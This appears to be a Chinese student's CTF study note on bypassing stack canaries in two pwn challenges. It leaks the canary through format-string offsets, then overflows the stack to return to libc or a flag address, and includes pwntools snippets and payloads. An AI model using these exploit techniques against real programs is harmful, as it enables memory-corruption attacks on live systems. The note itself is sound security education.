# Week3

- ### Pwn

  由一道题引出学习的内容

  这个题是buu上看的，bjdctf_2020_babyrop2

  拿到附件就先随便跑了一下

#### ![deabb5ee8b90d8836e86556108c95fe8](C:\Users\Lenovo\Documents\Tencent Files\1253016986\nt_qq\nt_data\Pic\2023-11\Ori\1)

```
*** stack smashing detected ***: terminated
```

- 没咋见过，百度一下是canary保护

  #### 知识点  ：通常[栈溢出](https://so.csdn.net/so/search?q=栈溢出&spm=1001.2101.3001.7020)的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖 ebp、eip 等，从而达到劫持控制流的目的。而栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。

  #### 总结一下就是为了程序能够被溢出的地方不让溢出

  所以学习内容如下

  

## Canary绕过

先由上面的题目说起，最后总结

### *格式化字符串：题目1

#### 思路：

- 利用格式化字符串泄露出canary的值
- 利用溢出漏洞，将canary的值填入绕过canary检测，利用ret2libc的方法获取shell

#### 操作：

##### 1.泄露canary的值

首先找一下输入点参数在栈上的相对位置（找偏移量）

先拖入ida，观察汇编代码，我们注意到了main函数中存在着canary值的判断

```
.text:00000000004008C3                 nop
.text:00000000004008C4                 mov     rax, [rbp+var_8]
.text:00000000004008C8                 xor     rax, fs:28h
```

先是把`rbp+var_8`移到了rax寄存器中，然后再对rax的值进行判断，从这里可以看出canary的值被存放在`rbp+var_8`的位置

查看var_8的栈后得知canary被存放在`rbp-0x8`的位置



先在上方汇编代码的`nop`处下断点调试，用格式化字符串漏洞泄露一下canary的位置

限制：只能输入6个字符，所以不能如下构造

```
aa%x %x %x.......
```

换了一种方法，输入`%n$p`,`n`是偏移量，配上`%$p`就能定位到偏移量处，输出该位置上的内容，`%p`是以16进制输出，输入如下

[^]: aa(0x6161)是ascii下的十六进制表示

用`aa`标注 来看我们跳到的地址是不是我们想要的，偏移量从1开始往后测试

```
aa%1$p aa%2$p...
```

直到`aa%6$p`的时候打印出的地址后面对上了6161

```
I'll give u some gift to help u!
aa%6$p
aa0x702436256161
```

我们接着点开format栈空间 看canary和format之间偏移

```
0000000000000010 format          db 8 dup(?)
0000000000000008 var_8           dq ?
```

0x10-0x8/8=1`64位8字节一组`

所以canary的位置：即format局部变量的地址的上一个位置，则`aa%7$p`即泄露canary的地址

##### 2.接下来把得到的canary的值填到相应的位置

我们可以用vuln里面的read函数造成栈溢出

```c
unsigned __int64 vuln()
{
  char buf[24]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Pull up your sword and tell me u story!");
  read(0, buf, 0x64uLL);
  return __readfsqword(0x28u) ^ v2;
}
```

这里就要考虑到buf到canary的偏移，buf是rbp-0x20,canary是rbp-8，所以要填充0x20-0x8个数据，再加上canary的值

泄露canary的部分exp如下（填完canary就是常规的ret2libc了）

```python
py=b'%7$p'
p.sendlineafter('help u!\n',py)
p.recvuntil("0x")
canary = int(p.recv(16),16)
print(hex(canary))
```

查了一些canary设定的知识：

Canary一般最低位是\x00，也就是结尾处，本意是用来截断字符串（可以利用），64位程序的canary的大小是8个字节，32位程序的canary的大小是4个字节



再来一道题目熟悉一下

### *格式化字符串：题目2

XCTF-攻防世界CTF平台-PWN类——Mary_Morton

#### 思路：

###### 漏洞1（栈溢出漏洞）

利用read造成栈溢出

```c
unsigned __int64 sub_400960()
{
  char buf[136]; // [rsp+0h] [rbp-90h] BYREF
  unsigned __int64 v2; // [rsp+88h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  memset(buf, 0, 0x80uLL);
  read(0, buf, 0x100uLL);
  printf("-> %s\n", buf);
  return __readfsqword(0x28u) ^ v2;
}
```

###### 漏洞2（格式化字符串）

printf这里输出buf的内容

```c
unsigned __int64 sub_4008EB()
{
  char buf[136]; // [rsp+0h] [rbp-90h] BYREF
  unsigned __int64 v2; // [rsp+88h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  memset(buf, 0, 0x80uLL);
  read(0, buf, 0x7FuLL);
  printf(buf);
  return __readfsqword(0x28u) ^ v2;
}
```

总结：利用格式化字符串和缓冲区溢出两个漏洞，先通过格式化字符串漏洞泄露canary的值，然后再进行栈溢出的覆盖

#### 操作：

##### 1.算偏移量用来泄露canary的值

和上一题一样，偏移一下输入的字符存储在格式化字符串的位置

偏移后还是%6$p对上了,第六个参数，然后去利用栈溢出漏洞，因为canary的值存在var_8里面，buf距离var_8有0x90-0x8=0x88，所以buf距离canary有0x88/8=17,而输入字符串的位置又在第6个参数，所以17+6=23（输入字符串距离canary 23个地址），在脚本中用%23$p可以直接泄露canary的地址，如下

```python
p.sendline('%23$p')
p.recvuntil('0x')
canary=int(p.recv(16),16)
print (canary)
```

##### 2.然后就是正常的栈溢出

```python
payload = 'a' * 0x88 + p64(canary) +'a'*8+p64(flag_addr)
```

先把buf栈区覆盖，然后填canary，最后再覆盖ebp





而以上两道题都是利用格式化字符串漏洞，还有一种常用的方式

### *覆盖截断字符：

#### 原理

Canary设计其低字节为`\x00`，本意是阻止被read、write等函数直接将Canary读出来。而通过栈溢出将低位的`\x00`覆写，就可以读出Canary的值

这里以buu上[第十五章][15.5.2 canary bypass]为例，buf长度为100字节，所以我们sendline100长度的数据，会触发canary，sendline会带一个\x0a,覆盖canary高位的\x00,这样就可以直接将canary的内容拿出来，再减去0xa，就是canary的值



### 总结：

两种常用方式来绕过canary保护：

1.覆盖截断字符

   条件：

- 存在`read`/`printf`等读出字符串的函数
- 可以两次栈溢出
- - **第一次是覆盖00字节，泄露canary**
  - **第二次是利用canary进行攻击**

2.格式化字符串





